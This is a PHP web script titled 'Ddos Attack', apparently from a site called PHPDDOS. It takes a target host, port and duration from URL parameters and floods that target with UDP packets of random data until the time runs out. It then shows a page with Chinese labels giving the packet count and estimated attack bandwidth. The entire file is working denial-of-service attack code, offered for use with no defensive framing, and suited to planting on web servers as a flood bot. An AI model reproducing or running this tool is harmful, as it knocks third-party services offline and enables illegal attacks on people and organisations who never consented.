<?php
header("charset='utf-8'");
set_time_limit(0);
ignore_user_abort(false);

function getmicrotime(){ 
	list($usec, $sec) = explode(" ",microtime()); 
	return ((float)$usec + (float)$sec); 
}

function getCode ($length = 32){

    $str = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';


    $result = '';
    $l = strlen($str)-1;
    $num=0;

    for($i = 0;$i < $length;$i ++){
        $num = rand(0, $l);
        $a=$str[$num];
        $result =$result.$a;
    }
return $result;
}

if (function_exists('fsockopen')) {
    $test="正常";
} else {
    $test="缺少必要函数";
}

$time_start = getmicrotime();  
$serverip = gethostbyname($_SERVER["SERVER_NAME"]);

$host = $_GET['host'];
$port = $_GET['port'];
$exec_time = $_GET['time'];
$Sendlen = rand(5,10);  //发送数据长度

$byte = 0;

//构造数据包
for($i=0;$i<$Sendlen;$i++){
        $out .= getCode();
    }
	
$max_time = time()+$exec_time;

while(1){
    $byte++;
    if(time() > $max_time){
        break;
    }
    $fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
        if($fp){
            fwrite($fp, $out);
            fclose($fp);
    }
}

$time_end = getmicrotime(); 
$time = $time_end - $time_start;
?>
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<title>Ddos Attack</title>
<style type="text/css">
body {margin: 0px;}
#confirm {background:rgba(125,125,125,0.4);filter:progid:DXImageTransform.Microsoft.Gradient(startColorstr=#40000000, endColorstr=#40000000);width:500px;margin:30px auto 0px auto;border:solid 1px #666;border-radius:3px;}
#confirm #inside {background:#FFFFFF;margin:5px;height:250px;border-radius:3px;}
#confirm #inside h1 {margin: 0px;font-family: Verdana, Geneva;font-size: 13px;padding:5px 10px;background-color: #f0f0f0;border:solid 1px #ddd;display: block;}
#confirm #inside #content {width: 300px;margin:25px auto 0px auto;line-height: 30px;font-size: 15px;font-family: Verdana, Geneva, sans-serif;}
</style>
</head>
<body>
<div id="confirm">
  <div id="inside">
    <h1>Ddos  udp flood</h1>
    <div id="content">
    服务器 IP :<?php echo $serverip;?><br>
    函数正常否: <?php echo $test;?><br>
    攻击总流量:<?php echo round(($byte*65*8)/(1024*1024),2).'Mbps' ?><br>
    攻击包总数:<?php echo $byte;?><br>
    运行总时间:<?php echo $time;?></div>
    <br>
    <h1 align="right">作者：<a href="http://www.phpddos.com">PHPDDOS</a></h1>
  </div>
</div>
</body>
</html>